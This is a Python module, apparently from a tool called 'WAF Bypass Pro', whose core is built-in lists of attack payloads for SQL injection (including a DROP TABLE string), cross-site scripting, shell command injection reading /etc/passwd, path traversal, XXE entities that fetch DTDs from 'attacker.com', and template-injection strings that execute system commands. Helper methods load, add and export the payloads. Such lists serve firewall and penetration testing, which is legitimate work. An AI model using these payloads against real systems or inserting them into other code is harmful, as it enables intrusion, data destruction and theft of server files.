"""
Payload Manager for WAF Bypass Pro

This module manages various types of attack payloads for testing WAF bypasses.
"""

import os
import json
from pathlib import Path
from typing import Dict, Any, List


class PayloadManager:
    """Manager for various attack payloads."""
    
    def __init__(self, config: Dict[str, Any], logger):
        """Initialize payload manager."""
        self.config = config
        self.logger = logger
        
        # Built-in payloads organized by attack type
        self.payloads = {
            'sqli': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users;--",
                "' AND 1=1--",
                "' OR 'a'='a",
                "\' OR \'1\'=\'1\' #",
                "1' OR '1'='1' /*",
                "admin'--",
                "admin' #",
                "admin'/*",
                "' or 1=1#",
                "' or 1=1--",
                "' or 1=1/*",
                "') or '1'='1--",
                "') or ('1'='1--",
                "1' OR 1=1 LIMIT 1,1--",
                "' OR SUBSTRING(@@version,1,1) = '5'--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>",
                "<video><source onerror=alert('XSS')>",
                "<audio src=x onerror=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<marquee onstart=alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
                "';alert('XSS');//",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<script>alert(/XSS/)</script>"
            ],
            'rce': [
                "; ls",
                "| whoami",
                "`id`",
                "$(id)",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "`cat /etc/passwd`",
                "$(cat /etc/passwd)",
                "; ping -c 4 127.0.0.1",
                "| ping -c 4 127.0.0.1",
                "`ping -c 4 127.0.0.1`",
                "$(ping -c 4 127.0.0.1)",
                "; uname -a",
                "| uname -a",
                "`uname -a`",
                "$(uname -a)",
                "; ps aux",
                "| ps aux",
                "`ps aux`",
                "$(ps aux)"
            ],
            'lfi': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc//passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "....\\....\\....\\etc\\passwd",
                "/etc/passwd%00",
                "../../../etc/passwd%00",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "php://input",
                "data://text/plain;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
                "expect://id",
                "file:///etc/passwd",
                "zip://test.zip%23shell.php"
            ],
            'xxe': [
                "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
                "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % xxe SYSTEM 'http://attacker.com/evil.dtd'> %xxe;]>",
                "<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
                "<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'php://filter/read=convert.base64-encode/resource=/etc/passwd'>]><data>&file;</data>",
                "<?xml version='1.0'?><!DOCTYPE replace [<!ENTITY example SYSTEM 'http://attacker.com/file.dtd'>]><userInfo><firstName>John</firstName><lastName>&example;</lastName></userInfo>"
            ],
            'ssti': [
                "{{7*7}}",
                "{{7*'7'}}",
                "${7*7}",
                "#{7*7}",
                "{{config}}",
                "{{request}}",
                "{{session}}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "${product.getClass().forName('java.lang.Runtime').getRuntime().exec('whoami')}",
                "{{''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}}",
                "{{request.getClass().forName('java.lang.Runtime').getRuntime().exec('whoami')}}",
                "<%=7*7%>",
                "<%= `id` %>"
            ]
        }
    
    def get_payloads(self, payload_type: str) -> List[Dict[str, str]]:
        """Get payloads of specified type."""
        if payload_type not in self.payloads:
            self.logger.warning(f"Unknown payload type: {payload_type}")
            return []
        
        payloads = []
        for payload in self.payloads[payload_type]:
            payloads.append({
                'type': payload_type,
                'payload': payload,
                'description': f"{payload_type.upper()} payload"
            })
        
        return payloads
    
    def get_all_payloads(self) -> List[Dict[str, str]]:
        """Get all available payloads."""
        all_payloads = []
        
        for payload_type in self.payloads.keys():
            all_payloads.extend(self.get_payloads(payload_type))
        
        return all_payloads
    
    def load_custom_payloads(self, file_path: str) -> bool:
        """Load custom payloads from a file."""
        try:
            if not os.path.exists(file_path):
                self.logger.error(f"Payload file not found: {file_path}")
                return False
            
            with open(file_path, 'r', encoding='utf-8') as f:
                if file_path.endswith('.json'):
                    custom_payloads = json.load(f)
                    for payload_type, payloads in custom_payloads.items():
                        if payload_type not in self.payloads:
                            self.payloads[payload_type] = []
                        self.payloads[payload_type].extend(payloads)
                else:
                    # Treat as plain text file with one payload per line
                    payloads = [line.strip() for line in f.readlines() if line.strip()]
                    if 'custom' not in self.payloads:
                        self.payloads['custom'] = []
                    self.payloads['custom'].extend(payloads)
            
            self.logger.info(f"Successfully loaded custom payloads from {file_path}")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to load custom payloads: {str(e)}")
            return False
    
    def add_payload(self, payload_type: str, payload: str, description: str = "") -> bool:
        """Add a single payload to the collection."""
        try:
            if payload_type not in self.payloads:
                self.payloads[payload_type] = []
            
            self.payloads[payload_type].append(payload)
            self.logger.info(f"Added {payload_type} payload: {payload[:50]}...")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to add payload: {str(e)}")
            return False
    
    def get_payload_types(self) -> List[str]:
        """Get list of available payload types."""
        return list(self.payloads.keys())
    
    def get_payload_count(self, payload_type: str = None) -> int:
        """Get count of payloads for a specific type or all types."""
        if payload_type:
            return len(self.payloads.get(payload_type, []))
        else:
            return sum(len(payloads) for payloads in self.payloads.values())
    
    def export_payloads(self, file_path: str, payload_type: str = None) -> bool:
        """Export payloads to a file."""
        try:
            payloads_to_export = {}
            
            if payload_type:
                if payload_type in self.payloads:
                    payloads_to_export[payload_type] = self.payloads[payload_type]
                else:
                    self.logger.error(f"Unknown payload type: {payload_type}")
                    return False
            else:
                payloads_to_export = self.payloads
            
            with open(file_path, 'w', encoding='utf-8') as f:
                if file_path.endswith('.json'):
                    json.dump(payloads_to_export, f, indent=2)
                else:
                    for ptype, payloads in payloads_to_export.items():
                        f.write(f"# {ptype.upper()} Payloads\n")
                        for payload in payloads:
                            f.write(f"{payload}\n")
                        f.write("\n")
            
            self.logger.info(f"Payloads exported to {file_path}")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to export payloads: {str(e)}")
            return False

